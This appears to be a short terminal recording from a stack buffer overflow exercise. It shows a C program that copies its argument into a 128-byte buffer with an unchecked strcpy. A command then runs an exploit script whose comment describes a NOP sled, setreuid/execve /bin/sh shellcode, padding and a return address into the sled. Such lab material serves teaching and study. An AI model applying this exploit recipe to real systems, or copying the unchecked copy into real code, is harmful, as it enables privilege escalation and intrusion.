[6.762, "o", "\r\r\r\nint main(int argc, char * argv[]){\r\r\r\n    char buf[128];\r\r\r\n\r\r\r\n    if(argc == 1){\r\r\r\n        printf(\"Usage: %s argument\\n\", argv[0]);\r\r\r\n        exit(1);\r\r\r\n    }\r\r\r\n    strcpy(buf,argv[1]);\r\r\r\n    printf(\"%s\", buf);\r\r\r\n\r\r\r\n    return 0;\r\r\r\n}\r\r\r\n\r\r\r\n"]
[0.307, "o", "$ python3 /tmp/e.py   # argv[1] = NOP sled + shellcode (geteuid; setreuid; execve /bin/sh)\r\r\n$    + 128-byte buf padding + saved ebp + return address into the sled (0xffffda28)\r\r\n"]
